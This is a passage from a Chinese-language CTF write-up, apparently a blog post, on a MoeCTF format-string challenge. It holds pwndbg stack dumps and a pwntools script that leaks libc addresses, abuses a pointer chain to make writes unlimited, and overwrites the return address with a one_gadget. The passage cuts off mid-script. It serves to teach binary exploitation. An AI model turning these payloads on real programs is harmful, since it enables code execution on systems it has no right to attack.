<p>注意到<code>i</code>是栈上的，第一次我们修改一个三连以上指针的第三个指针为<code>i</code>的符号位地址，第二次利用第二个指针来修改<code>i</code>的内容</p>
<p>这是第二次read前</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">01:0008│-008 0x7ffea6500678 ◂— 0x80040136f</span><br><span class="line">02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</span><br><span class="line">03:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">04:0020│+010 0x7ffea6500690 ◂— 0x1000</span><br><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0x200401110</span><br><span class="line">06:0030│ r9  0x7ffea65006a0 ◂— 1</span><br><span class="line">07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</span><br></pre></td></tr></table></figure>
<p>可以看见</p>
<p><code>int i; // [rsp+Ch] [rbp-4h]</code>与<code>05:0028│+018 0x7ffea6500698 ◂— 0x200401110</code>，这个2正是存放在主函数的栈上的<code>i</code></p>
<p>所以地址是<code>rbp+0x18</code>，又因为要改的是符号位，所以地址是<code>rbp+0x18+7</code></p>
<p>详细演示一下这段代码的作用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(i_addr).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn\x00&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0xff</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hhn&quot;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>第二次printf前</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">01:0008│-008 0x7ffea6500678 ◂— 0x80040136f</span><br><span class="line">02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</span><br><span class="line">03:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">04:0020│+010 0x7ffea6500690 ◂— 0x1000</span><br><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0x200401110</span><br><span class="line">06:0030│ r9  0x7ffea65006a0 ◂— 1</span><br><span class="line">07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</span><br><span class="line">08:0040│+030 0x7ffea65006b0 ◂— 0</span><br><span class="line">09:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a0</span><br><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">0c:0060│+050 0x7ffea65006d0 ◂— 0</span><br><span class="line">0d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c</span><br><span class="line">0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">10:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">11:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">12:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c</span><br><span class="line">13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c</span><br><span class="line">14:00a0│+090 0x7ffea6500710 ◂— 0x791300000000</span><br><span class="line">15:00a8│+098 0x7ffea6500718 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab87600</span><br><span class="line">1a:00d0│+0c0 0x7ffea6500740 ◂— 0</span><br><span class="line">1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">1f:00f8│+0e8 0x7ffea6500768 ◂— 0</span><br><span class="line">20:0100│+0f0 0x7ffea6500770 ◂— 0</span><br><span class="line">21:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">22:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 1</span><br><span class="line">23:0118│+108 0x7ffea6500788 ◂— 0</span><br><span class="line">24:0120│+110 0x7ffea6500790 ◂— 0</span><br><span class="line">25:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">27:0138│+128 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">28:0140│+130 0x7ffea65007b0 ◂— 1</span><br><span class="line">29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">2a:0150│+140 0x7ffea65007c0 ◂— 0</span><br><span class="line">2b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br></pre></td></tr></table></figure>
<p>printf后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">01:0008│-008 0x7ffea6500678 ◂— 0x80040136f</span><br><span class="line">02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</span><br><span class="line">03:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">04:0020│+010 0x7ffea6500690 ◂— 0x1000</span><br><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0x200401110</span><br><span class="line">06:0030│+020 0x7ffea65006a0 ◂— 1</span><br><span class="line">07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</span><br><span class="line">08:0040│+030 0x7ffea65006b0 ◂— 0</span><br><span class="line">09:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a0</span><br><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">0c:0060│+050 0x7ffea65006d0 ◂— 0</span><br><span class="line">0d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c</span><br><span class="line">0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">10:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">11:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">12:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c</span><br><span class="line">13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c</span><br><span class="line">14:00a0│+090 0x7ffea6500710 ◂— 0x791300000000</span><br><span class="line">15:00a8│+098 0x7ffea6500718 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab87600</span><br><span class="line">1a:00d0│+0c0 0x7ffea6500740 ◂— 0</span><br><span class="line">1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">1f:00f8│+0e8 0x7ffea6500768 ◂— 0</span><br><span class="line">20:0100│+0f0 0x7ffea6500770 ◂— 0</span><br><span class="line">21:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">22:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 1</span><br><span class="line">23:0118│+108 0x7ffea6500788 ◂— 0</span><br><span class="line">24:0120│+110 0x7ffea6500790 ◂— 0</span><br><span class="line">25:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">27:0138│+128 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">28:0140│+130 0x7ffea65007b0 ◂— 1</span><br><span class="line">29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">2a:0150│+140 0x7ffea65007c0 ◂— 0</span><br><span class="line">2b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br></pre></td></tr></table></figure>
<p>关键的变化是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br></pre></td></tr></table></figure>
<p>此时<code>0x7ffea650069f</code>指向的恰好是<code>i</code>的最高位地址<code>05:0028│+018 0x7ffea6500698 ◂— 0x200401110</code></p>
<p>第三次printf前</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">01:0008│-008 0x7ffea6500678 ◂— 0x80040136f</span><br><span class="line">02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</span><br><span class="line">03:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">04:0020│+010 0x7ffea6500690 ◂— 0x1000</span><br><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0x300401110</span><br><span class="line">06:0030│+020 0x7ffea65006a0 ◂— 1</span><br><span class="line">07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</span><br><span class="line">08:0040│+030 0x7ffea65006b0 ◂— 0</span><br><span class="line">09:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a0</span><br><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">0c:0060│+050 0x7ffea65006d0 ◂— 0</span><br><span class="line">0d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c</span><br><span class="line">0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">10:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">11:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">12:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c</span><br><span class="line">13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c</span><br><span class="line">14:00a0│+090 0x7ffea6500710 ◂— 0x791300000000</span><br><span class="line">15:00a8│+098 0x7ffea6500718 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab87600</span><br><span class="line">1a:00d0│+0c0 0x7ffea6500740 ◂— 0</span><br><span class="line">1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">1f:00f8│+0e8 0x7ffea6500768 ◂— 0</span><br><span class="line">20:0100│+0f0 0x7ffea6500770 ◂— 0</span><br><span class="line">21:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">22:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 1</span><br><span class="line">23:0118│+108 0x7ffea6500788 ◂— 0</span><br><span class="line">24:0120│+110 0x7ffea6500790 ◂— 0</span><br><span class="line">25:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">27:0138│+128 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">28:0140│+130 0x7ffea65007b0 ◂— 1</span><br><span class="line">29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</span><br><span class="line">2a:0150│+140 0x7ffea65007c0 ◂— 0</span><br><span class="line">2b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br></pre></td></tr></table></figure>
<p>printf后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff</span><br><span class="line">01:0008│-008 0x7ffea6500678 ◂— 0x80040136f</span><br><span class="line">02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</span><br><span class="line">03:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">04:0020│+010 0x7ffea6500690 ◂— 0x1000</span><br><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0xff00000300401110</span><br><span class="line">06:0030│+020 0x7ffea65006a0 ◂— 1</span><br><span class="line">07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</span><br><span class="line">08:0040│+030 0x7ffea65006b0 ◂— 0</span><br><span class="line">09:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a0</span><br><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff</span><br><span class="line">0c:0060│+050 0x7ffea65006d0 ◂— 0</span><br><span class="line">0d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c</span><br><span class="line">0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff</span><br><span class="line">0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">10:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">11:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">12:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c</span><br><span class="line">13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c</span><br><span class="line">14:00a0│+090 0x7ffea6500710 ◂— 0x791300000000</span><br><span class="line">15:00a8│+098 0x7ffea6500718 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab87600</span><br><span class="line">1a:00d0│+0c0 0x7ffea6500740 ◂— 0</span><br><span class="line">1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">1f:00f8│+0e8 0x7ffea6500768 ◂— 0</span><br><span class="line">20:0100│+0f0 0x7ffea6500770 ◂— 0</span><br><span class="line">21:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">22:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 1</span><br><span class="line">23:0118│+108 0x7ffea6500788 ◂— 0</span><br><span class="line">24:0120│+110 0x7ffea6500790 ◂— 0</span><br><span class="line">25:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">27:0138│+128 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">28:0140│+130 0x7ffea65007b0 ◂— 1</span><br><span class="line">29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1ff</span><br><span class="line">2a:0150│+140 0x7ffea65007c0 ◂— 0</span><br><span class="line">2b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们利用的是<code>0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</code></p>
<p>找到第二个指针<code>29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x100</code></p>
<p>偏移量是47，我们就可以利用这个来修改我们<code>i</code>的最高位了</p>
<p>关键的变化是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0x300401110</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0xff00000300401110</span><br></pre></td></tr></table></figure>
<p>可以看到我们已经实现了无限写</p>
<p>下面的修改也是一模一样，就不再赘述了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+<span class="string">b&quot;%33$p&quot;</span>+<span class="string">b&quot;%13$p&quot;</span>+<span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">data = p.recv(<span class="number">50</span>)</span><br><span class="line">addrs = data[<span class="number">8</span>:].decode()</span><br><span class="line">addr1_str = addrs[<span class="number">2</span>:<span class="number">14</span>]</span><br><span class="line">addr2_str = addrs[<span class="number">16</span>:<span class="number">28</span>]</span><br><span class="line">addr3_str = addrs[<span class="number">30</span>:<span class="number">42</span>]</span><br><span class="line">libc_main_addr = <span class="built_in">int</span>(addr1_str, <span class="number">16</span>)</span><br><span class="line">return_addr = <span class="built_in">int</span>(addr2_str, <span class="number">16</span>)</span><br><span class="line">rbp_addr = <span class="built_in">int</span>(addr3_str, <span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_main_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_main_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;return_addr: <span class="subst">&#123;<span class="built_in">hex</span>(return_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;rbp_addr: <span class="subst">&#123;<span class="built_in">hex</span>(rbp_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_base=libc_main_addr-<span class="number">128</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">one_gadget_addr=libc_base+<span class="number">0xebc81</span></span><br><span class="line">log.success(<span class="string">f&quot;one_gadget_addr: <span class="subst">&#123;<span class="built_in">hex</span>(one_gadget_addr)&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_1 = one_gadget_addr &amp; <span class="number">0xffff</span> <span class="comment"># 后两位</span></span><br><span class="line">one_gadget_2 = (one_gadget_addr &gt;&gt; <span class="number">16</span>)&amp; <span class="number">0xffff</span> <span class="comment"># 往前推俩</span></span><br><span class="line">one_gadget_3 = (one_gadget_addr &gt;&gt; <span class="number">32</span>)&amp; <span class="number">0xffff</span> <span class="comment"># 再往前推两位</span></span><br><span class="line">main_ret_addr=(rbp_addr+<span class="number">0x28</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">main_ret_addr_2=(rbp_addr+<span class="number">0x28</span>+<span class="number">2</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">main_ret_addr_3=(rbp_addr+<span class="number">0x28</span>+<span class="number">4</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">main_rbp_addr=(rbp_addr+<span class="number">0x20</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">main_rbp_addr_2=(rbp_addr+<span class="number">0x20</span>+<span class="number">2</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">main_rbp_addr_3=(rbp_addr+<span class="number">0x20</span>+<span class="number">4</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">talk_ret_addr=(rbp_addr+<span class="number">0x8</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">r_addr=rbp_addr+<span class="number">0x110</span></span><br><span class="line">r_addr_1=r_addr &amp; <span class="number">0xffff</span></span><br><span class="line">r_addr_2=(r_addr &gt;&gt; <span class="number">16</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">r_addr_3=(r_addr &gt;&gt; <span class="number">32</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">i_addr=(rbp_addr+<span class="number">0x18</span>+<span class="number">7</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改i值达到无限写</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(i_addr).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn\x00&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0xff</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hhn&quot;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改返回地址</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload4=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(main_ret_addr).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload4)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload5=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">p.send(payload5)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload6=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(main_ret_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn\x00&quot;</span></span><br><span class="line">p.send(payload6)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You enraged the monster-prepare for battle!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;fffffff0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You start talking to him...\n&quot;</span>)</span><br><span class="line">payload7=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">p.send(payload7)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span 